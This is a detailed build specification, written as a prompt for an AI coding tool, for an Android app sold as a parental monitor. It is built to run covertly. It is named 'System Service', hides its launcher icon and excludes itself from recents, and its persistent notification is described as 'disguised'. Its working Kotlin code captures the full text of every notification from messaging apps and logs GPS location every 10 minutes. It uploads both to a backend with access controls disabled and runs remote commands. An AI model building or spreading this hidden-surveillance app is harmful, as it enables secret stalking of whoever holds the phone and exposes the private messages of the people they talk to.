# GOOGLE AI STUDIO — COMPLETE REBUILD PROMPT
# Parent Child Monitor v2 (Notifications + Location)
# Copy EVERYTHING below this line and paste into Google AI Studio

---

## INSTRUCTION TO AI

You are rebuilding an existing Android Kotlin + Jetpack Compose parental monitoring app.
The Supabase database is **already migrated**. Do NOT change the database schema.
Rebuild the entire Android app to match this specification exactly.
Delete all old screenshot / screen-lock code. Build the new notification + location flow.

---

## PROJECT INFO

| Item | Value |
|------|-------|
| App name | System Service |
| Package | `com.aistudio.monitorapp.wszrk` |
| Namespace | `com.example` |
| Min SDK | 28 |
| Target SDK | 36 |
| Stack | Kotlin, Jetpack Compose, Material 3, OkHttp, Room DB, WorkManager |
| Supabase Project ID | `mrrqsbfdarzsyywdeqya` |
| Supabase URL | `https://mrrqsbfdarzsyywdeqya.supabase.co` |
| Env vars | `SUPABASE_URL` and `SUPABASE_KEY` (anon key) via `.env` + Secrets Gradle Plugin |
| Database status | ✅ Already migrated — use tables below as-is |
| RLS | Disabled on all tables (development mode) |

---

## WHAT THIS APP DOES (NEW FLOW)

1. Parent installs app on **child's phone**
2. Setup wizard runs:
   - Grant **location** permission (foreground + background)
   - Grant **notification access** (Android Settings)
   - **Create account** OR **login** (email + username + password)
   - Enter **child name** (e.g. Ahmed, Sara)
   - Disable battery optimization
   - Setup completes → **hide app icon** → background service starts
3. App runs silently in background:
   - Captures **every notification** (WhatsApp, Instagram, Messages, TikTok, etc.) with full text
   - Tracks **GPS location** every 10 minutes
   - Sends **heartbeat** every 15 minutes (battery + online status)
4. Parent opens **dashboard website** (separate project) → logs in with same email/password → sees only their children's notifications + locations

### Multiple children
Same parent account on multiple phones. Each phone gets a different `child_name`. Dashboard shows all children under one login.

---

## DELETE THESE COMPLETELY (OLD FEATURES)

Remove all code, files, permissions, and references for:

| Remove | Files / code |
|--------|-------------|
| Screenshot capture | `captureScreenshotAndUpload()`, MediaProjection, ImageReader, VirtualDisplay |
| Screen lock/unlock | `ScreenReceiver.kt` — delete file |
| Offline screen events | `OfflineSyncManager.kt` — rewrite for notifications/location only |
| Screenshot upload | `SupabaseClient.uploadScreenshot()`, `createBucket()` |
| WakeUp listener | `WakeUpListener.kt` — delete file |
| Self-destruct (optional) | Keep only if already working, otherwise remove |
| MediaProjection setup UI | All screen capture launchers in MainActivity |
| Screenshot bucket settings | All `screenshot_bucket` SharedPreferences UI |
| Storage bucket `demo` | No longer used |
| Manifest permission | `FOREGROUND_SERVICE_MEDIA_PROJECTION` |
| Manifest service type | `mediaProjection` from foregroundServiceType |

### Database tables already deleted (do NOT reference these):
- `screen_events` ❌
- `offline_events_log` ❌
- `wakeup_signals` ❌

---

## SUPABASE DATABASE SCHEMA (ALREADY EXISTS — DO NOT RECREATE)

### Table: `parent_profiles`
Auto-created when parent signs up via Supabase Auth trigger.

```
id              UUID PK       → same as auth.users.id
username        TEXT UNIQUE
display_name    TEXT
phone           TEXT
created_at      TIMESTAMPTZ
updated_at      TIMESTAMPTZ
```

### Table: `devices` (child phones)
```
device_id                       TEXT PK
parent_id                       UUID FK → auth.users.id
child_name                      TEXT         (e.g. "Ahmed")
device_name                     TEXT         (phone model)
battery_level                   INTEGER
app_version                     TEXT
location_permission_granted     BOOLEAN
notification_access_granted   BOOLEAN
setup_completed                 BOOLEAN
icon_hidden                     BOOLEAN
is_active                       BOOLEAN
first_seen                      TIMESTAMPTZ
last_seen                       TIMESTAMPTZ
notes                           TEXT
```

### Table: `notifications_log` (MAIN FEATURE)
```
id                  BIGINT PK AUTO
parent_id           UUID NOT NULL
device_id           TEXT NOT NULL
app_package         TEXT NOT NULL     (e.g. com.whatsapp)
app_name            TEXT              (e.g. WhatsApp)
notification_key    TEXT
notification_id     TEXT
title               TEXT              (sender name)
message             TEXT              (main text)
big_text            TEXT              (expanded full message)
sub_text            TEXT
summary_text        TEXT
info_text           TEXT
conversation_title  TEXT              (chat/group name)
category            TEXT              (msg, call, social)
channel_id          TEXT
group_key           TEXT
is_group            BOOLEAN
is_ongoing          BOOLEAN
is_clearable        BOOLEAN
posted_at           TIMESTAMPTZ NOT NULL
raw_extras          JSONB             (all extras as JSON backup)
created_at          TIMESTAMPTZ
```

### Table: `location_logs`
```
id              BIGINT PK AUTO
parent_id       UUID NOT NULL
device_id       TEXT NOT NULL
latitude        DOUBLE PRECISION NOT NULL
longitude       DOUBLE PRECISION NOT NULL
accuracy        REAL
altitude        REAL
speed           REAL
bearing         REAL
provider        TEXT
address         TEXT
recorded_at     TIMESTAMPTZ NOT NULL
created_at      TIMESTAMPTZ
```

### Table: `device_heartbeat`
```
device_id         TEXT PK
parent_id         UUID
last_heartbeat    TIMESTAMPTZ
is_active         BOOLEAN
battery_level     INTEGER
```

---

## ANDROID FILE STRUCTURE (BUILD THIS)

```
app/src/main/java/com/example/
├── MainActivity.kt              → Setup wizard only (re-entry via secret dialer code)
├── MonitorService.kt            → Foreground service (NO screenshots)
├── NotificationListener.kt      → NEW: NotificationListenerService
├── LocationTracker.kt           → NEW: FusedLocationProvider background GPS
├── SupabaseClient.kt            → REWRITE: auth + notifications + location + heartbeat
├── AuthManager.kt               → NEW: signup, login, token storage, refresh
├── DeviceRegistrar.kt           → NEW: register/update child device in Supabase
├── OfflineQueue.kt              → REWRITE: queue failed notifications + locations
├── BootReceiver.kt              → Keep: start service on boot
├── HeartbeatWorker.kt           → Keep: update every 15 min
├── IconHider.kt                 → NEW: hide launcher icon after setup
├── WakeupReceiver.kt            → Keep if needed for alarms
└── ui/theme/                    → Keep existing Material 3 theme
```

### Files to DELETE:
- `ScreenReceiver.kt`
- `WakeUpListener.kt`

---

## ANDROID MANIFEST (FULL REPLACEMENT)

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">

    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />

    <application
        android:allowBackup="false"
        android:icon="@mipmap/ic_launcher"
        android:label="System Service"
        android:supportsRtl="true"
        android:theme="@style/Theme.MyApplication">

        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:excludeFromRecents="true"
            android:taskAffinity=""
            android:label="System Service"
            android:theme="@style/Theme.MyApplication">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <!-- Main foreground service -->
        <service
            android:name=".MonitorService"
            android:foregroundServiceType="dataSync|location"
            android:exported="false" />

        <!-- Notification listener -->
        <service
            android:name=".NotificationListener"
            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
            android:exported="true">
            <intent-filter>
                <action android:name="android.service.notification.NotificationListenerService" />
            </intent-filter>
        </service>

        <receiver
            android:name=".BootReceiver"
            android:exported="true"
            android:directBootAware="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>

    </application>
</manifest>
```

---

## GRADLE DEPENDENCIES TO ADD

```kotlin
// In app/build.gradle.kts dependencies block — ADD:
implementation("com.google.android.gms:play-services-location:21.3.0")
implementation("androidx.security:security-crypto:1.1.0-alpha06")  // EncryptedSharedPreferences
```

Keep existing: OkHttp, Room, WorkManager, Compose, Secrets Gradle Plugin.

---

## SETUP WIZARD (MainActivity — 6 Steps)

Show wizard only if `setup_completed` is false in SharedPreferences.
If `setup_completed` is true AND icon is hidden → finish activity immediately (app runs in background only).

### Step 1 — Location Permission
- Request `ACCESS_FINE_LOCATION` + `ACCESS_COARSE_LOCATION`
- Then request `ACCESS_BACKGROUND_LOCATION` (Android 10+)
- Show explanation: "Required to track child location for safety"
- Block "Next" until granted

### Step 2 — Notification Access
- Show button: "Enable Notification Access"
- Opens: `startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))`
- Poll every 1 second until `NotificationListener.isEnabled(context)` returns true
- `isEnabled` check:
```kotlin
fun isNotificationAccessGranted(context: Context): Boolean {
    val flat = Settings.Secure.getString(
        context.contentResolver, "enabled_notification_listeners"
    ) ?: return false
    return flat.contains(context.packageName)
}
```

### Step 3 — Create Account or Login
Two tabs: **Sign Up** | **Log In**

**Sign Up fields:** email, username, password, confirm password
**Log In fields:** email, password

On success store in EncryptedSharedPreferences:
- `access_token`
- `refresh_token`
- `parent_id` (UUID from response user.id)
- `username`

### Step 4 — Child Name
- Text field: "Child Name" (e.g. Ahmed)
- Shows: "This phone will appear as [Ahmed] on your dashboard"

### Step 5 — Battery Optimization
- Button opens battery exemption dialog (keep existing code)

### Step 6 — Complete Setup
1. Call `DeviceRegistrar.register(childName)` → upsert into `devices` table
2. Start `MonitorService` as foreground service
3. Call `IconHider.hideLauncherIcon(context)`
4. Set `setup_completed = true` in SharedPreferences
5. Update `devices.setup_completed = true` and `devices.icon_hidden = true` in Supabase
6. `finish()` activity — app disappears from launcher

---

## AUTH API (SupabaseClient / AuthManager)

### Sign Up
```
POST https://mrrqsbfdarzsyywdeqya.supabase.co/auth/v1/signup
Headers: apikey: {ANON_KEY}, Content-Type: application/json

Body:
{
  "email": "parent@gmail.com",
  "password": "MyPassword123",
  "data": {
    "username": "parent_usman",
    "display_name": "Usman"
  }
}

Response: { access_token, refresh_token, user: { id, email } }
→ parent_id = user.id
→ parent_profiles row auto-created by database trigger
```

### Log In
```
POST https://mrrqsbfdarzsyywdeqya.supabase.co/auth/v1/token?grant_type=password
Headers: apikey: {ANON_KEY}, Content-Type: application/json

Body: { "email": "parent@gmail.com", "password": "MyPassword123" }

Response: { access_token, refresh_token, user: { id } }
```

### Token Refresh
```
POST https://mrrqsbfdarzsyywdeqya.supabase.co/auth/v1/token?grant_type=refresh_token
Body: { "refresh_token": "..." }
```

### All data API calls use:
```
Authorization: Bearer {access_token}
apikey: {ANON_KEY}
Content-Type: application/json
```

---

## DEVICE REGISTRATION API

```
POST https://mrrqsbfdarzsyywdeqya.supabase.co/rest/v1/devices
Headers:
  Authorization: Bearer {access_token}
  apikey: {ANON_KEY}
  Content-Type: application/json
  Prefer: resolution=merge-duplicates,return=minimal

Body:
{
  "device_id": "android_unique_id",
  "parent_id": "parent_uuid",
  "child_name": "Ahmed",
  "device_name": "Samsung Galaxy A54",
  "app_version": "2.0",
  "battery_level": 87,
  "location_permission_granted": true,
  "notification_access_granted": true,
  "setup_completed": true,
  "icon_hidden": true,
  "is_active": true,
  "last_seen": "2026-06-09T15:00:00Z"
}
```

---

## NOTIFICATION LISTENER (NotificationListener.kt)

This is the CORE feature. Implement exactly:

```kotlin
class NotificationListener : NotificationListenerService() {

    companion object {
        private const val TAG = "NotificationListener"
        private val SKIP_PACKAGES = setOf(
            "android",
            "com.android.systemui",
            "com.google.android.gms"
        )
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        try {
            val packageName = sbn.packageName

            // Skip own app and system noise
            if (packageName == applicationContext.packageName) return
            if (packageName in SKIP_PACKAGES) return

            val extras = sbn.notification.extras ?: return
            val parentId = AuthManager.getParentId(applicationContext) ?: return
            val deviceId = SupabaseClient.getDeviceId(applicationContext)

            val appName = try {
                packageManager.getApplicationLabel(
                    packageManager.getApplicationInfo(packageName, 0)
                ).toString()
            } catch (e: Exception) { packageName }

            // Build raw_extras JSON from all extras keys
            val rawExtrasJson = JSONObject()
            for (key in extras.keySet()) {
                try {
                    rawExtrasJson.put(key, extras.get(key)?.toString() ?: "")
                } catch (e: Exception) { }
            }

            val payload = JSONObject().apply {
                put("parent_id", parentId)
                put("device_id", deviceId)
                put("app_package", packageName)
                put("app_name", appName)
                put("notification_key", sbn.key)
                put("notification_id", sbn.id.toString())
                put("title", extras.getString("android.title") ?: "")
                put("message", extras.getCharSequence("android.text")?.toString() ?: "")
                put("big_text", extras.getCharSequence("android.bigText")?.toString() ?: "")
                put("sub_text", extras.getCharSequence("android.subText")?.toString() ?: "")
                put("summary_text", extras.getCharSequence("android.summaryText")?.toString() ?: "")
                put("info_text", extras.getCharSequence("android.infoText")?.toString() ?: "")
                put("conversation_title", extras.getString("android.conversationTitle") ?: "")
                put("category", sbn.notification.category ?: "")
                put("channel_id", sbn.notification.channelId ?: "")
                put("group_key", sbn.groupKey ?: "")
                put("is_group", sbn.isGroup)
                put("is_ongoing", sbn.isOngoing)
                put("is_clearable", sbn.isClearable)
                put("posted_at", Instant.ofEpochMilli(sbn.postTime).toString())
                put("raw_extras", rawExtrasJson)
            }

            SupabaseClient.sendNotification(payload) { success ->
                if (!success) OfflineQueue.saveNotification(payload.toString())
            }

        } catch (e: Exception) {
            Log.e(TAG, "Safe catch — notification error: ${e.message}")
            // NEVER rethrow — never crash
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        // Optional: log dismissal — do not crash
        try { } catch (e: Exception) { }
    }

    override fun onListenerConnected() {
        super.onListenerConnected()
        Log.d(TAG, "Notification listener connected and active")
    }

    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        try {
            requestRebind(ComponentName(this, NotificationListener::class.java))
        } catch (e: Exception) {
            Log.e(TAG, "Rebind failed: ${e.message}")
        }
    }
}
```

### Send notification API:
```
POST https://mrrqsbfdarzsyywdeqya.supabase.co/rest/v1/notifications_log
Headers: Authorization: Bearer {access_token}, apikey: {ANON_KEY}, Prefer: return=minimal
Body: { all fields from payload above }
```

---

## LOCATION TRACKER (LocationTracker.kt)

```kotlin
class LocationTracker(private val context: Context) {
    private val fusedClient = LocationServices.getFusedLocationProviderClient(context)
    private var callback: LocationCallback? = null

    fun start() {
        try {
            val request = LocationRequest.Builder(
                Priority.PRIORITY_BALANCED_POWER_ACCURACY,
                10 * 60 * 1000L  // 10 minutes
            ).setMinUpdateIntervalMillis(5 * 60 * 1000L).build()

            callback = object : LocationCallback() {
                override fun onLocationResult(result: LocationResult) {
                    try {
                        val loc = result.lastLocation ?: return
                        val parentId = AuthManager.getParentId(context) ?: return
                        val deviceId = SupabaseClient.getDeviceId(context)

                        val payload = JSONObject().apply {
                            put("parent_id", parentId)
                            put("device_id", deviceId)
                            put("latitude", loc.latitude)
                            put("longitude", loc.longitude)
                            put("accuracy", loc.accuracy.toDouble())
                            put("altitude", loc.altitude)
                            put("speed", loc.speed.toDouble())
                            put("bearing", loc.bearing.toDouble())
                            put("provider", loc.provider ?: "fused")
                            put("recorded_at", Instant.ofEpochMilli(loc.time).toString())
                        }

                        SupabaseClient.sendLocation(payload) { success ->
                            if (!success) OfflineQueue.saveLocation(payload.toString())
                        }
                    } catch (e: Exception) {
                        Log.e("LocationTracker", "Safe catch: ${e.message}")
                    }
                }
            }

            fusedClient.requestLocationUpdates(request, callback!!, Looper.getMainLooper())
        } catch (e: SecurityException) {
            Log.e("LocationTracker", "Permission missing: ${e.message}")
        } catch (e: Exception) {
            Log.e("LocationTracker", "Start failed: ${e.message}")
        }
    }

    fun stop() {
        try { callback?.let { fusedClient.removeLocationUpdates(it) } } catch (e: Exception) { }
    }
}
```

### Send location API:
```
POST https://mrrqsbfdarzsyywdeqya.supabase.co/rest/v1/location_logs
Headers: Authorization: Bearer {access_token}, apikey: {ANON_KEY}, Prefer: return=minimal
Body: { parent_id, device_id, latitude, longitude, accuracy, speed, provider, recorded_at }
```

---

## MONITOR SERVICE (Simplified — NO screenshots)

```kotlin
class MonitorService : Service() {
    private var locationTracker: LocationTracker? = null

    override fun onCreate() {
        super.onCreate()
        try { startForegroundWithNotification() } catch (e: Exception) { }
        try { locationTracker = LocationTracker(this).also { it.start() } } catch (e: Exception) { }
        try { scheduleWorkManagerHeartbeat() } catch (e: Exception) { }
        try { OfflineQueue.startSyncLoop(this) } catch (e: Exception) { }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        try { startForegroundWithNotification() } catch (e: Exception) { }
        try { updateHeartbeat() } catch (e: Exception) { }
        return START_STICKY  // auto-restart if killed
    }

    override fun onDestroy() {
        try { locationTracker?.stop() } catch (e: Exception) { }
        super.onDestroy()
    }
}
```

### Heartbeat API (every 15 min via WorkManager):
```
POST https://mrrqsbfdarzsyywdeqya.supabase.co/rest/v1/device_heartbeat
Headers: Authorization: Bearer {access_token}, apikey: {ANON_KEY}
         Prefer: resolution=merge-duplicates,return=minimal
Body:
{
  "device_id": "android_id",
  "parent_id": "parent_uuid",
  "last_heartbeat": "2026-06-09T15:00:00Z",
  "is_active": true,
  "battery_level": 87
}
```

Also update `devices.last_seen` and `devices.battery_level` on each heartbeat.

---

## HIDE APP ICON (IconHider.kt)

```kotlin
object IconHider {
    fun hide(context: Context) {
        try {
            val pm = context.packageManager
            val component = ComponentName(context, MainActivity::class.java)
            pm.setComponentEnabledSetting(
                component,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            Log.e("IconHider", "Hide failed: ${e.message}")
        }
    }
}
```

### Re-open hidden app (parent re-configuration):
```bash
adb shell am start -n com.aistudio.monitorapp.wszrk/com.example.MainActivity
```

---

## OFFLINE QUEUE (Reliability)

When network fails, save to Room DB. Retry every 5 minutes.

```
Tables (local Room DB):
- pending_notifications (id, json_payload, created_at)
- pending_locations (id, json_payload, created_at)
```

On successful upload → delete from local DB.
Never crash if Room DB fails — log and continue.

---

## NEVER CRASH RULES (MANDATORY)

Every callback, listener, service method, and network response MUST follow:

```kotlin
try {
    // work here
} catch (e: Exception) {
    Log.e(TAG, "Error: ${e.message}")
    // NEVER rethrow
    // NEVER call throw
    // App must keep running
}
```

Apply to:
- `NotificationListener.onNotificationPosted`
- `LocationCallback.onLocationResult`
- `MonitorService.onCreate`
- `OkHttp onFailure` and `onResponse`
- `BootReceiver.onReceive`
- `HeartbeatWorker.doWork`

---

## PARENT DASHBOARD WEBSITE (Separate project — build after Android app)

Tech: Next.js + Supabase JS + Tailwind

### Login page
```typescript
await supabase.auth.signInWithPassword({ email, password })
```

### Dashboard queries (filtered by logged-in parent)
```typescript
const { data: { user } } = await supabase.auth.getUser()

// Children list
await supabase.from('devices').select('*').eq('parent_id', user.id)

// Notifications feed
await supabase.from('notifications_log')
  .select('*').eq('parent_id', user.id)
  .order('posted_at', { ascending: false }).limit(100)

// Location history
await supabase.from('location_logs')
  .select('*').eq('parent_id', user.id)
  .order('recorded_at', { ascending: false }).limit(50)

// Realtime live feed
supabase.channel('live')
  .on('postgres_changes', {
    event: 'INSERT', schema: 'public',
    table: 'notifications_log',
    filter: `parent_id=eq.${user.id}`
  }, handler).subscribe()
```

---

## WHAT NOTIFICATIONS CAPTURE (Realistic expectations)

| App | What parent sees |
|-----|-----------------|
| WhatsApp | Sender name + message preview text |
| Instagram | "username liked your photo", DM previews |
| Messages/SMS | Sender + message preview |
| TikTok | Notification text (likes, comments, DMs) |
| Snapchat | Preview if shown in notification |
| Calls | "Missed call from Mom" |

**NOT captured:** Full chat history, deleted messages, in-app content without notification, messages before app was installed.

---

## TESTING CHECKLIST

After building, verify:

- [ ] Setup wizard completes all 6 steps
- [ ] App icon disappears from launcher after setup
- [ ] Service survives app close and phone reboot
- [ ] Send WhatsApp message → row appears in `notifications_log` within seconds
- [ ] Walk with phone → row appears in `location_logs` within 10 min
- [ ] `devices` table shows correct `parent_id` and `child_name`
- [ ] Dashboard login shows only that parent's children
- [ ] App does NOT crash when notification arrives
- [ ] App does NOT crash when network is offline (queues locally)

---

## SUMMARY OF CHANGES

| Old (remove) | New (build) |
|-------------|------------|
| Screenshots every 1 min | Notifications in realtime |
| Screen lock/unlock events | Full notification text capture |
| Supabase Storage upload | Supabase DB insert |
| No parent accounts | Email + username + password accounts |
| No child identification | child_name per device |
| App icon always visible | Icon hidden after setup |
| No location | GPS every 10 minutes |
| MediaProjection permission | Notification access permission |
| Unreliable capture | Reliable background service |

---

## DASHBOARD COMMANDS (device_commands table — REQUIRED)

The parent dashboard writes commands to `device_commands`. Android app MUST poll or Realtime-subscribe and execute them.

### Table: device_commands
```
id                  UUID PK
parent_id           UUID
device_id           TEXT
command_type        TEXT  → 'GPS_TRACK' | 'HEALTH_CHECK'
status              TEXT  → 'pending' | 'completed' | 'failed' | 'cached'
response_latitude   DOUBLE
response_longitude  DOUBLE
response_accuracy   REAL
response_battery    INTEGER
response_message    TEXT
created_at          TIMESTAMPTZ
completed_at        TIMESTAMPTZ
```

### Android CommandHandler (add to MonitorService or new file)
Every 30 seconds (or via Supabase Realtime on device_commands INSERT):
1. Query: `GET /rest/v1/device_commands?device_id=eq.{id}&status=eq.pending`
2. For each pending command:
   - **GPS_TRACK**: get current fused location → PATCH command with lat/lng/accuracy, status='completed', completed_at=now
   - **HEALTH_CHECK**: read battery level + send heartbeat → PATCH with response_battery, status='completed'
3. If offline when command arrives, process on next network reconnect (status stays pending or cached)

### Update command API:
```
PATCH /rest/v1/device_commands?id=eq.{command_id}
Body: {
  "status": "completed",
  "response_latitude": 24.8607,
  "response_longitude": 67.0011,
  "response_accuracy": 12.5,
  "response_battery": 87,
  "completed_at": "2026-06-09T15:00:00Z"
}
```

---

## IMPORTANT NOTES FOR AI

1. Database is ALREADY set up — do not run migration SQL
2. RLS is disabled — use `access_token` in Authorization header for all inserts
3. Use OkHttp (already in project) for all API calls — do not add Retrofit unless needed
4. Keep existing Material 3 theme and color scheme
5. Keep `excludeFromRecents="true"` on MainActivity
6. Keep foreground service notification disguised as "System Service"
7. Do NOT add screenshot or MediaProjection code under any circumstances
8. Wrap every operation in try/catch — zero crashes is a hard requirement
9. `applicationId` must stay `com.aistudio.monitorapp.wszrk`

---

*End of prompt — Parent Child Monitor v2*
*Supabase project: mrrqsbfdarzsyywdeqya*
*Database migrated: 2026-06-09*
